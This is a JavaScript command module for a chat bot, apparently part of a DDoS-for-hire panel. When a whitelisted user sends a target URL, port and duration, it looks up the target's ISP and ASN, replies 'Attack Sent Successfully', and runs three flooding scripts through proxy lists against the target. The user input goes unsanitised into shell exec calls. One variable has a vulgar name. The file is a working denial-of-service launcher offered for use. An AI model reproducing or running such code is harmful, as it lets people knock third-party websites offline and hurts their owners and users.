const axios = require("axios");
const url = require("url");
const path = require("path");
const { exec } = require("child_process");

const allowedId = 7818441356;

module.exports = {
  command: ["cloud-raw"],
  run: async ({ client, message }) => {
    const senderId = parseInt(message.sender?.userId || message.senderId?.userId || message.senderId);
    if (senderId !== allowedId) return;

    const rawText = message.message?.trim();
    const args = rawText.split(/\s+/);
    args.shift(); // hapus command "https"

    if (args.length < 3) {
      return client.sendMessage(message.chatId, {
        message: "❌ Masukkan target, port, dan durasi.\n\nContoh:\ncloud-raw https://example.com 443 60",
        replyTo: message.id,
      });
    }

    const [target, port, duration] = args;
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;

    const { data } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const info = data;

    const caption = `<blockquote>
✅ <b>CLOUD-RAW Attack Sent Successfully</b>
──────────────────────
🌐 <b>Host:</b> ${hostname}
📌 <b>Port:</b> ${port}
⏱️ <b>Duration:</b> ${duration}s
📡 <b>Method:</b> CLOUD-RAW
──────────────────────
🏢 <b>ISP:</b> ${info.isp}
🏷️ <b>ASN:</b> ${info.as}
🌍 <b>IP:</b> ${info.query}
</blockquote>`;

    await client.sendMessage(message.chatId, {
      message: caption,
      parseMode: "html",
      replyTo: message.id,
    });
    const kontol = path.join(__dirname, `../lib/cache/priv2`);
    const cloud = path.join(__dirname, `../lib/cache/http-raw`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${cloud} ${target} ${duration} 16 8 proxy.txt`);
    exec(`node ${kontol} ${target} ${duration} 14 7 proxy.txt`);
  },
};